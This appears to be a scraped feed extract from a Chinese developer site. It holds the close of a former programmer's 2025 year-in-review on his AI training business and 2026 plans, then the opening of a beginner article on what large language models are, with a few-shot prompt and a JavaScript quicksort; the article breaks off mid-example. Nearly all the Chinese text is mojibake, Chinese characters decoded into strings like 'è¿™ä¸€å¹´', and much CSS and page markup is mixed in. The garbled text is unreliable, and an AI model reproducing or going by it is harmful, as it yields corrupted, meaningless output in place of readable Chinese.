<p>è¿™ä¸€å¹´ï¼Œæˆ‘ä»å‚ä¸Â <strong>ç¦ AI å…¬ç›Šç»„ç»‡</strong>Â å¼€å§‹ï¼Œé€æ­¥æ·±å…¥åˆ°çº¿ä¸‹ AI ç§‘æ™®ã€è¯¾ç¨‹åˆ†äº«ï¼Œå†åˆ°åæœŸæ¨åŠ¨å•†ä¸šåŒ–å°è¯•ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p>è§†é¢‘å®šåˆ¶</p>
</li>
<li>
<p>ä¼ä¸šåŸ¹è®­</p>
</li>
<li>
<p>å®šå‘çº¿ä¸‹è¯¾ç¨‹</p>
</li>
</ul>
<p>åˆ°äº† 2025 å¹´åº•ï¼Œæˆ‘ä»¬æ­£å¼æˆç«‹äº†å…¬å¸ï¼Œç”¨æ›´è§„èŒƒçš„æ–¹å¼æ‰¿æ¥çº¿ä¸‹ä¸šåŠ¡ã€‚</p>
<p>è¿™æ¡çº¿åœ¨ 2025 å¹´å¹¶ä¸æ˜¯â€œçˆ†å‘å‹æ”¶ç›Šâ€ï¼Œä½†å®ƒçš„æ„ä¹‰åœ¨äºï¼š</p>
<blockquote>
<p><strong>ä¸ºæœªæ¥æ›´å¤§çš„é¡¹ç›®æ‰¿æ¥èƒ½åŠ›ï¼Œæå‰æ­å»ºåŸºç¡€è®¾æ–½ã€‚</strong></p>
</blockquote>
<p>æˆ‘å¯¹çº¿ä¸‹å…¬å¸çš„å®šä½ä¹Ÿå¾ˆæ¸…æ™°ï¼šä¸æ˜¯è¿½æ±‚çŸ­æœŸè§„æ¨¡ï¼Œè€Œæ˜¯ä¸º 2026â€“2027 å¹´çš„ä¼ä¸šæœåŠ¡ã€é•¿æœŸåˆä½œæ‰“åŸºç¡€ã€‚</p>
<h2 data-id="heading-5">å››ã€æ”¶å…¥ç»“æ„çš„å˜åŒ–ï¼Œæ¯”æ•°å­—æ›´é‡è¦</h2>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘å¼€å§‹åˆ»æ„ä¸å†çº ç»“â€œèµšäº†å¤šå°‘â€ï¼Œè€Œæ˜¯è§‚å¯ŸÂ <strong>æ”¶å…¥ç»“æ„æ˜¯å¦å¥åº·</strong>ã€‚</p>
<p>æ•´ä½“æ¥çœ‹ï¼Œæ”¶å…¥æ¥æºé€æ¸å‘ˆç°å‡ºå‡ ä¸ªç‰¹ç‚¹ï¼š</p>
<ul>
<li>
<p>å†…å®¹å‹æ”¶å…¥ï¼šç¨³å®šã€å¯å¤åˆ¶ï¼Œæ˜¯åŸºç¡€ç°é‡‘æµ</p>
</li>
<li>
<p>æœåŠ¡å‹æ”¶å…¥ï¼šå•ä»·åœ¨æå‡ï¼Œä½†ä¸å†æ— é™æ¥å•</p>
</li>
<li>
<p>å•†å• / å¹¿å‘Šï¼šä¸ç¡®å®šï¼Œä½†ä½œä¸ºå¢é‡å­˜åœ¨</p>
</li>
<li>
<p>æ—§å‰¯ä¸šï¼šé€æ­¥é€€å‡ºï¼Œä¸å†ä½œä¸ºæ ¸å¿ƒæŠ•å…¥æ–¹å‘</p>
</li>
</ul>
<p>æˆ‘åœ¨åšçš„ï¼Œå…¶å®æ˜¯æŠŠæ—¶é—´ä»â€œçŸ­æœŸæ¢é’±â€ï¼Œæ…¢æ…¢è½¬å‘â€œé•¿æœŸèµ„äº§â€ã€‚</p>
<h2 data-id="heading-6">äº”ã€2025 å¹´æœ€å¤§çš„ç°å®é—®é¢˜ï¼šæ—¶é—´ä¸å¤Ÿç”¨</h2>
<p>å¦‚æœè¯´ 2025 å¹´æœ€å¤§çš„æŒ‘æˆ˜æ˜¯ä»€ä¹ˆï¼Œé‚£ä¸æ˜¯æ²¡æ–¹å‘ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>æ–¹å‘å¤ªæ¸…æ™°ä¹‹åï¼Œæ—¶é—´å¼€å§‹ä¸¥é‡ä¸å¤Ÿç”¨ã€‚</strong></p>
</blockquote>
<p>çº¿ä¸Šå†…å®¹ã€çº¿ä¸‹äº‹åŠ¡ã€å…¬å¸æ¨è¿›ï¼Œå æ®äº†å¤§éƒ¨åˆ†ç²¾åŠ›ï¼Œå¯¼è‡´ä¸€äº›æˆ‘éå¸¸æƒ³åšã€ä¹Ÿéå¸¸é‡è¦çš„äº‹æƒ…è¢«åå¤æ¨è¿Ÿï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>AI ç¼–ç¨‹</li>
<li>AI æ™ºèƒ½ä½“</li>
<li>äº§å“åŒ–ï¼ˆé£ä¹¦ä»˜è´¹æ‰‹å†Œï¼‰</li>
</ul>
<p>è¿™è®©æˆ‘æ„è¯†åˆ°ä¸€ä¸ªå…³é”®é—®é¢˜ï¼š</p>
<blockquote>
<p><strong>å­¦ä¹ ä¸èƒ½åªæ˜¯â€œé¢å¤–ä»»åŠ¡â€ï¼Œè€Œå¿…é¡»ç›´æ¥æœåŠ¡äºä¸šåŠ¡ææ•ˆã€‚</strong></p>
</blockquote>
<p>è¿™ä¹Ÿç›´æ¥å†³å®šäº†æˆ‘ 2026 å¹´çš„å­¦ä¹ æ–¹å‘ã€‚</p>
<h2 data-id="heading-7">å…­ã€è¿™ä¸€å¹´è¸©è¿‡çš„å‘</h2>
<p>å›çœ‹ 2025 å¹´ï¼Œæˆ‘è¸©è¿‡çš„å‘ä¸»è¦é›†ä¸­åœ¨ä¸‰ç‚¹ï¼š</p>
<ol>
<li><strong>æ—¶é—´ç¢ç‰‡åŒ–çš„è¯•é”™æœŸ</strong><br/>
å¤šé¡¹ç›®å¹¶è¡Œï¼Œçœ‹ä¼¼åŠªåŠ›ï¼Œå®åˆ™ç¨€é‡ŠåŠ¿èƒ½</li>
<li><strong>è¿‡åº¦ä¾èµ–äººåŠ›äº¤ä»˜</strong><br/>
äº§å“åŒ–æ¨è¿›ä¸å¤Ÿå¿«ï¼Œå½±å“é•¿æœŸå¤åˆ©</li>
<li><strong>é•¿æœŸå¿½è§†èº«ä½“ä¸ä½œæ¯</strong><br/>
ç†¬å¤œå’Œé«˜è´Ÿè·å¼€å§‹åå™¬æ•ˆç‡</li>
</ol>
<h2 data-id="heading-8">ä¸ƒã€2026å¹´è§„åˆ’ï¼šæŠŠç³»ç»Ÿæ­å®Œæ•´</h2>
<p>2026 å¹´ï¼Œæˆ‘ç»™è‡ªå·±çš„å”¯ä¸€ä¸»çº¿å¾ˆæ˜ç¡®ï¼š</p>
<blockquote>
<p><strong>æŠŠä¸ªäººèƒ½åŠ›ç³»ç»ŸåŒ–ã€äº§å“åŒ–ï¼Œå‡å°‘å¯¹â€œæˆ‘æœ¬äººåœ¨çº¿æ—¶é—´â€çš„ä¾èµ–ã€‚</strong></p>
</blockquote>
<p>å…·ä½“ä¼šèšç„¦åœ¨å‡ ä¸ªæ–¹å‘ï¼š</p>
<h4 data-id="heading-9">1. äº§å“å±‚ï¼ˆå¿…é¡»åšæˆï¼‰</h4>
<ul>
<li>é£ä¹¦ä»˜è´¹æ‰‹å†Œï¼šä½œä¸ºæ ¸å¿ƒæµé‡æ‰¿æ¥</li>
<li>å½•æ’­è¯¾ç¨‹ + ç›´æ’­ï¼šå–è‡ªå·±çš„çŸ¥è¯†äº§å“</li>
</ul>
<h4 data-id="heading-10">2. æœåŠ¡å±‚ï¼ˆæŒç»­æ·±åŒ–ï¼‰</h4>
<ul>
<li>æˆå“äº¤ä»˜ï¼ˆè§†é¢‘ / å›¾ç‰‡ï¼‰</li>
<li>ComfyUI å·¥ä½œæµå®šåˆ¶</li>
<li>è¡Œä¸šé•œåƒ / å·¥å…·æœåŠ¡ï¼ŒæŒ‰æœˆæˆ–æŒ‰å¹´è®¢é˜…</li>
</ul>
<h4 data-id="heading-11">3. èƒ½åŠ›å±‚ï¼ˆå¿…å­¦ï¼‰</h4>
<ul>
<li>AI ç¼–ç¨‹</li>
<li>AI æ™ºèƒ½ä½“<br/>
ç›®æ ‡ä¸æ˜¯è½¬å‹ï¼Œè€Œæ˜¯Â <strong>ææ•ˆ + å°è£… + äº§å“åŒ–</strong>ã€‚</li>
</ul>
<h4 data-id="heading-12">4. çº¿ä¸‹å…¬å¸</h4>
<ul>
<li>ç¨³å®šè¿è½¬</li>
<li>æ‰¿æ¥æ›´æˆç†Ÿçš„ä¼ä¸šé¡¹ç›®</li>
<li>ä¸è¿½æ±‚çˆ†å‘ï¼Œä½†è¿½æ±‚é•¿æœŸå¯æŒç»­</li>
</ul>
<h2 data-id="heading-13">å†™åœ¨æœ€å</h2>
<p>å›çœ‹ 2025 å¹´ï¼Œæˆ‘æœ€å¤§çš„æ”¶è·ä¸æ˜¯æŸä¸ªå…·ä½“æˆç»©ï¼Œè€Œæ˜¯ç»ˆäºæ¸…æ¥šåœ°çŸ¥é“ï¼š</p>
<blockquote>
<p><strong>æˆ‘åœ¨æ­ä¸€å¥—ä»€ä¹ˆæ ·çš„ç³»ç»Ÿï¼Œé€šå‘å“ªé‡Œã€‚</strong></p>
</blockquote>
<p>2026 å¹´ï¼Œæˆ‘ä¸ä¼šå†é¢‘ç¹è¯•é”™ï¼Œè€Œæ˜¯å›´ç»•å·²ç»éªŒè¯è¿‡çš„æ–¹å‘ï¼ŒæŠŠè¿™å¥—ç³»ç»Ÿä¸€å—ä¸€å—æ­å®Œæ•´ã€‚</p>
<p>æ…¢ä¸€ç‚¹ï¼Œä½†æ›´ç¨³ã€‚</p>
<p>ä¸Šé¢ç®—æ˜¯æˆ‘è¿™ä¸€å¹´çš„æ€»ç»“ï¼Œæˆ‘åˆ†äº«å‡ºæ¥ä¹Ÿæ˜¯ç»™å¤§å®¶å¯ä»¥è¿‘è·ç¦»çœ‹çœ‹ä¸€ä¸ªç¦»èŒçš„ç¨‹åºå‘˜çš„æ—¥å¸¸ï¼Œæœ‰åšçš„ä¸å¥½çš„åœ°æ–¹ä¹Ÿæœ‰åšçš„å¯å–çš„åœ°æ–¹ï¼Œæˆ‘ä¹Ÿæ˜¯ä¸ªæ™®é€šäººï¼Œä¸€ç›´åœ¨å°è¯•å’ŒåŠªåŠ›ï¼Œæ¬¢è¿æ¥äº¤æµï¼Œå¸Œæœ›2026å¹´å‘å±•çš„æ›´å¥½ã€‚</p>
<p>æˆ‘æ˜¯å˜Ÿå˜Ÿï¼Œä¸€ä¸ª12å¹´å…¨æ ˆç¨‹åºå‘˜ï¼Œç°åœ¨ç¦»èŒåˆ›ä¸šï¼Œéœ€è¦ä½ çš„ä¸‰è¿~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹-00]]></title>    <link>https://juejin.cn/post/7600976289064042496</link>    <guid>https://juejin.cn/post/7600976289064042496</guid>    <pubDate>2026-01-30T14:56:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600976289064042496" data-draft-id="7600976289064026112" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹-00"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T14:56:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€è¯ºæ»šé›ªçƒ"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹-00
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€è¯ºæ»šé›ªçƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:56:27.000Z" title="Fri Jan 30 2026 14:56:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä½ æœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œå½“ä½ é—® ChatGPT ä¸€ä¸ªé—®é¢˜æ—¶ï¼Œå®ƒæ˜¯å¦‚ä½•"æ€è€ƒ"å¹¶ç»™å‡ºå›ç­”çš„ï¼Ÿ</p>
<p>ä»Šå¤©å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿâ€”â€”æŠ±æ­‰ï¼Œæˆ‘æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚
è¯·ç”¨ JavaScript å†™ä¸€ä¸ªå¿«é€Ÿæ’åºâ€”â€”å‡ ç§’é’Ÿå†…ï¼Œä»£ç å°±å‡ºç°åœ¨å±å¹•ä¸Šã€‚</p>
<p>åŒæ ·æ˜¯ AIï¼Œä¸ºä»€ä¹ˆèƒ½å†™ä»£ç å´ä¸èƒ½æŸ¥å¤©æ°”ï¼Ÿå¤§è¯­è¨€æ¨¡å‹çš„"çŸ¥è¯†"ä»å“ªé‡Œæ¥ï¼Ÿå®ƒæ˜¯çœŸçš„"ç†è§£"æˆ‘ä»¬çš„è¯å—ï¼Ÿ</p>
<p>è¿™äº›é—®é¢˜ï¼Œæ­£æ˜¯æˆ‘ä»¬æ¢ç´¢å¤§è¯­è¨€æ¨¡å‹ï¼ˆLarge Language Modelï¼ŒLLMï¼‰ä¸–ç•Œçš„èµ·ç‚¹ã€‚</p>
<hr/>
<h2 data-id="heading-1">1. ä»€ä¹ˆæ˜¯å¤§è¯­è¨€æ¨¡å‹</h2>
<p><strong>å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰</strong> æ˜¯ä¸€ç§ç»è¿‡æµ·é‡æ–‡æœ¬æ•°æ®è®­ç»ƒçš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œèƒ½å¤Ÿç†è§£å’Œç”Ÿæˆäººç±»è¯­è¨€ã€‚</p>
<h3 data-id="heading-2">å…³é”®ç‰¹å¾</h3>

























<table><thead><tr><th>ç‰¹å¾</th><th>è¯´æ˜</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td><strong>å¤§è§„æ¨¡è®­ç»ƒ</strong></td><td>ä½¿ç”¨ TB çº§æ–‡æœ¬æ•°æ®</td><td>GPT-4 è®­ç»ƒäº†çº¦ 1 ä¸‡äº¿ tokens</td></tr><tr><td><strong>æ·±åº¦ç¥ç»ç½‘ç»œ</strong></td><td>æ•°åäº¿åˆ°æ•°ä¸‡äº¿å‚æ•°</td><td>GPT-3 æœ‰ 1750 äº¿å‚æ•°</td></tr><tr><td><strong>é€šç”¨èƒ½åŠ›</strong></td><td>ä¸éœ€è¦ä¸“é—¨è®­ç»ƒå°±èƒ½å®Œæˆå¤šç§ä»»åŠ¡</td><td>ç¿»è¯‘ã€å†™ä½œã€ç¼–ç¨‹ã€æ¨ç†</td></tr></tbody></table>
<h3 data-id="heading-3">é€šä¿—ç†è§£</h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼š</p>
<ul>
<li>ä½ é˜…è¯»äº†äº’è”ç½‘ä¸Šå‡ ä¹æ‰€æœ‰çš„æ–‡æœ¬</li>
<li>ä½ è®°ä½äº†å…¶ä¸­çš„æ¨¡å¼ã€è§„å¾‹å’ŒçŸ¥è¯†</li>
<li>å½“æœ‰äººé—®ä½ é—®é¢˜æ—¶ï¼Œä½ èƒ½æ ¹æ®è®°å¿†ç”Ÿæˆå›ç­”</li>
</ul>
<p>è¿™å°±æ˜¯å¤§è¯­è¨€æ¨¡å‹åšçš„äº‹æƒ…ï¼</p>
<h3 data-id="heading-4">æ ¸å¿ƒå·¥ä½œåŸç†</h3>
<p>LLM çš„æœ¬è´¨æ˜¯ä¸€ä¸ª<strong>æ–‡å­—æ¥é¾™æœºå™¨</strong>ï¼š</p>
<pre><code class="hljs language-matlab" lang="matlab">è¾“å…¥: <span class="hljs-string">"ä»Šå¤©å¤©æ°”"</span>
LLM é¢„æµ‹ä¸‹ä¸€ä¸ªè¯å¯èƒ½æ˜¯:
- <span class="hljs-string">"çœŸå¥½"</span>    (æ¦‚ç‡ <span class="hljs-number">30</span><span class="hljs-comment">%)</span>
- <span class="hljs-string">"å¾ˆçƒ­"</span>    (æ¦‚ç‡ <span class="hljs-number">25</span><span class="hljs-comment">%)</span>
- <span class="hljs-string">"æ€ä¹ˆæ ·"</span>  (æ¦‚ç‡ <span class="hljs-number">20</span><span class="hljs-comment">%)</span>
</code></pre>
<p><strong>è®­ç»ƒæµç¨‹</strong>ï¼š</p>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            LLM è®­ç»ƒæµç¨‹                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                         â”‚
â”‚  1. æ•°æ®æ”¶é›†                             â”‚
â”‚     â”œâ”€â”€ ç½‘é¡µæ–‡æœ¬                         â”‚
â”‚     â”œâ”€â”€ ä¹¦ç±æ–‡ç«                          â”‚
â”‚     â””â”€â”€ ä»£ç åº“                           â”‚
â”‚                                         â”‚
â”‚  2. é¢„è®­ç»ƒ                               â”‚
â”‚     â”œâ”€â”€ å­¦ä¹ è¯­è¨€æ¨¡å¼                     â”‚
â”‚     â”œâ”€â”€ å­¦ä¹ ä¸–ç•ŒçŸ¥è¯†                     â”‚
â”‚     â””â”€â”€ å­¦ä¹ é€»è¾‘æ¨ç†                     â”‚
â”‚                                         â”‚
â”‚  3. å¾®è°ƒ                                 â”‚
â”‚     â”œâ”€â”€ å¯¹é½äººç±»åå¥½                     â”‚
â”‚     â”œâ”€â”€ éµå¾ªæŒ‡ä»¤                         â”‚
â”‚     â””â”€â”€ å®‰å…¨æ€§è®­ç»ƒ                       â”‚
â”‚                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-5">å››å¤§æ ¸å¿ƒèƒ½åŠ›</h3>
<p><strong>1. è¯­è¨€ç†è§£</strong></p>
<ul>
<li>ç†è§£æ–‡æœ¬å«ä¹‰</li>
<li>è¯†åˆ«æƒ…æ„Ÿå€¾å‘</li>
<li>æå–å…³é”®ä¿¡æ¯</li>
</ul>
<p><strong>2. è¯­è¨€ç”Ÿæˆ</strong></p>
<ul>
<li>å†™æ–‡ç« ã€å†™ä»£ç </li>
<li>åˆ›æ„å†™ä½œ</li>
<li>æ€»ç»“æç‚¼</li>
</ul>
<p><strong>3. é€»è¾‘æ¨ç†</strong></p>
<ul>
<li>æ•°å­¦è®¡ç®—</li>
<li>é€»è¾‘æ¨ç†</li>
<li>é—®é¢˜è§£å†³</li>
</ul>
<p><strong>4. å°‘æ ·æœ¬å­¦ä¹ </strong></p>
<ul>
<li>çœ‹å‡ ä¸ªä¾‹å­å°±èƒ½å­¦ä¼šæ–°ä»»åŠ¡</li>
<li>ä¸éœ€è¦é‡æ–°è®­ç»ƒ</li>
</ul>
<hr/>
<h2 data-id="heading-6">2. æ¡ˆä¾‹</h2>
<h3 data-id="heading-7">æ¡ˆä¾‹ 1ï¼šå°‘æ ·æœ¬å­¦ä¹ çš„ç¥å¥‡ä¹‹å¤„</h3>
<p>è®©æˆ‘ä»¬çœ‹çœ‹ LLM å¦‚ä½•é€šè¿‡å‡ ä¸ªä¾‹å­å­¦ä¼šæ–°ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> prompt = <span class="hljs-string">`
ä¾‹å­1ï¼š
è¾“å…¥ï¼šè‹¹æœ
è¾“å‡ºï¼šæ°´æœ

ä¾‹å­2ï¼š
è¾“å…¥ï¼šèƒ¡èåœ
è¾“å‡ºï¼šè”¬èœ

è¾“å…¥ï¼šé¦™è•‰
è¾“å‡ºï¼šï¼Ÿ
`</span>;
<span class="hljs-comment">// LLM èƒ½æ¨æ–­ï¼šé¦™è•‰ â†’ æ°´æœ</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2b6a30f81de4e989380d4c407bd6893~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770389789&amp;x-signature=aOmds6PQEGJJhLVF23Ta9w8%2FBX0%3D" alt="image.png" loading="lazy"/></p>
<p><strong>è§£æ</strong>ï¼šæ— éœ€é‡æ–°è®­ç»ƒï¼Œåªéœ€å‡ ä¸ªç¤ºä¾‹ï¼ŒLLM å°±èƒ½ç†è§£åˆ†ç±»è§„å¾‹å¹¶åº”ç”¨åˆ°æ–°é—®é¢˜ã€‚</p>
<h3 data-id="heading-8">æ¡ˆä¾‹ 2ï¼šä»£ç ç”Ÿæˆèƒ½åŠ›</h3>
<p><strong>è¾“å…¥</strong>ï¼š"è¯·ç”¨ JavaScript å†™ä¸€ä¸ªå¿«é€Ÿæ’åº"</p>
<p><strong>LLM è¾“å‡º</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">quickSort</span>(<span class="hljs-params">arr</span>) {
  <span class="hljs-keyword">if</span> (arr.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">return</span> arr;
  }
  <span class="hljs-keyword">const</span> pivot = arr[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(arr.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)];
  <span class="hljs-keyword">const</span> left = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x &lt; pivot);
  <span class="hljs-keyword">const</span> middle = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x === pivot);
  <span class="hljs-keyword">const</span> right = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x &gt; pivot);
  <span class="hljs-keyword">return</span> [...<span class="hljs-title function_">quickSort</span>(left), ...middle, ...<span class="hljs-title function_">quickSort</span>(right)];
}
</code></pre>
<p><strong>è§£æ</strong>ï¼šLLM ä»è®­ç»ƒæ•°æ®ä¸­å­¦ä¼šäº†ç¼–ç¨‹æ¨¡å¼å’Œç®—æ³•é€»è¾‘ï¼Œèƒ½å¤Ÿç”Ÿæˆå¯è¿è¡Œçš„ä»£ç ã€‚</p>
<h3 data-id="heading-9">æ¡ˆä¾‹ 3ï¼šå‘ç° LLM çš„å±€é™æ€§</h3>
<p><strong>æµ‹è¯• 1ï¼šå®æ—¶ä¿¡æ¯</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">ç”¨æˆ·: <span class="hljs-string">"ä»Šå¤©å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ"</span>
<span class="hljs-symbol">LLM:</span> <span class="hljs-string">"æŠ±æ­‰ï¼Œæˆ‘æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚"</span>
